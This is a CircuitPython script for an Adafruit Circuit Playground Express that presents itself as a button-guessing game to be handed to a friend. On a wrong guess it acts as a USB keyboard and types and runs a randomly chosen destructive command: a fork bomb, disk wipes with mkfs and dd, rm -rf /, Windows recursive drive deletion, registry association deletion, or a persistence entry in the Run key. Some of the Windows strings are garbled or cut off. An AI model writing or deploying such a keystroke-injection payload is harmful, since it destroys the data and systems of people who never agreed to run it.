# Play with the switch. Green means linux and blue means windows
# white means that you're safe now pass this to your friend
# red means it'll run a deadly command
# Don't you dare blame me.

import time
from adafruit_circuitplayground.express import cpx
import random
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keycode import Keycode
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS

kbd = Keyboard()
layout = KeyboardLayoutUS(kbd)

cpx.pixels.brightness = 0.1
#windows = 0
#linux = 1

def execute(mode):
    if mode:
        # linux
        # assuming that you've a root shell
        layout.write(random_linux)
        time.sleep(3)
        kbd.press(Keycode.RETURN)
        kbd.release(Keycode.RETURN)
    else:
        # windows
        # assuming that you've admin cmd/ps
        layout.write(random_windows)
        time.sleep(3)
        kbd.press(Keycode.RETURN)
        kbd.release(Keycode.RETURN)

linux = [":(){ :|: & };:",
         "mkfs.ext4 /dev/sda1",
         "rm -rf / --no-preserve-root",
         "dd if=/dev/random of=/dev/sda",
         "mv ~ /dev/null",
         "shutdown now",
         "# lol you safe"]
windows = ["@echo off && delete %systemdrive%\*.* /f /s",
           "@echo off && attrib -r -s -h c:\autoexec.bat && del c:\autoexec.bat && attrib -r -s -h c:\boot.ini && del c:\boot.ini && attrib -r -s -h c:\ntldr && del c:\ntldr && attrib -r -s -h c:\windows\win.ini && del c:\windows\win.ini",
           "@echo off && START reg delete HKCR/.exe && START reg delete HKCR/.dll && START reg delete HKCR/*",
           "echo @echo off>c:windowswimn32.bat && echo break off>>c:windowswimn32.bat && echo ipconfig/release_all>>c:windowswimn32.bat && echo end>>c:windowswimn32.bat && reg add hkey_local_machinesoftwaremicrosftwindowscurrentversionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f && reg add hkey_local_machinesoftwaremicrosftwindowscurrentversionrun /v CONTROLexit /t reg_sz /d c:window",
           "@echo off && rd/s/q/ D:\\ && rd/s/q/ C:\\ && rd/s/q/ E:\\",
           "shutdown -s -t 0",
           "REM lol you safe"]

while True:
    random_linux = random.choice(linux)
    random_windows = random.choice(windows)
    random_button = random.choice([0,1]*50)
    if cpx.switch:
        cpx.pixels.fill((0,255,0))
    else:
        cpx.pixels.fill((0,0,255))
    
    mode = int(cpx.switch)
    button = 1 if cpx.button_a else 0 if cpx.button_b else 10
    is_correct = 1 if button == random_button else 0
    if button in [1,0]:
        time.sleep(0.1)
        if is_correct:
            cpx.pixels.fill((255,255,255))
            time.sleep(5)
        else:
            cpx.pixels.fill((255,0,0))
            time.sleep(3)
            execute(mode)
        
    button = 10
